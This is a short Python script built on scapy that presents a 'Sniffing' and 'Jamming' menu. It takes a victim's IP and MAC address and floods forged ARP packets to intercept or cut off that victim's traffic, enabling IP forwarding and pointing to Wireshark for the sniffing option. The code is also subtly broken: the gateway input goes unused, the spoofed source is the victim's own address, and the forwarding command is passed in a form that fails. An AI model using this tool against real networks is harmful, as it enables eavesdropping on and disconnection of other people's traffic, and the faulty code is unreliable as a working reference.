import time
from scapy.all import *
import subprocess
from colorama import Fore, Back, Style
def jamming():
    sip=input(Fore.BLUE+"Enter router's default gateway:\t")
    disp=input(Fore.BLUE+"Enter the Victim IP address:\t")
    dmac=input(Fore.BLUE+"Enter the Victim mac address:\t")
    print(Fore.YELLOW+"Processing",end="")
    for i in range(10):
        print(".",end="")
        time.sleep(0.5)
    arp=ARP()
    arp.psrc=disp
    arp.hwdst=dmac
    arp.pdst=disp
    print(Fore.GREEN+"\nAttack Start",end="")
    while True:
        send(arp)
        print(".",end="")
        time.sleep(0.5)


def sniffing():
    sip=input(Fore.BLUE+"Enter router's default gateway:\t")
    disp=input(Fore.BLUE+"Enter the Victim IP address:\t")
    dmac=input(Fore.BLUE+"Enter the Victim mac address:\t")
    print(Fore.YELLOW+"Processing",end="")
    
    for i in range(10):
        print(".",end="")
        time.sleep(0.5)
    arp=ARP()
    arp.psrc=disp
    arp.hwdst=dmac
    arp.pdst=disp
    subprocess.run("sysctl -w net.ipv4.ip_forward=1")
    print(Fore.BLUE+"Open Wireshark and analyze the packet")
    print(Fore.GREEN+"\nSniffing Under Process",end="")
    while True:
        send(arp)
        print(".",end="")
        time.sleep(0.5)

    


def enter(num):
    if num == 1:
        sniffing()
    elif num == 2:
        jamming()
    else:
        num = int(input(Fore.RED+"Please Enter correct option:"))
        enter(num)

print(Fore.CYAN+"[1] Sniffing\n"+Fore.MAGENTA+"[2] Jamming")
enter(int(input(Fore.CYAN+"Enter the Option you want:")))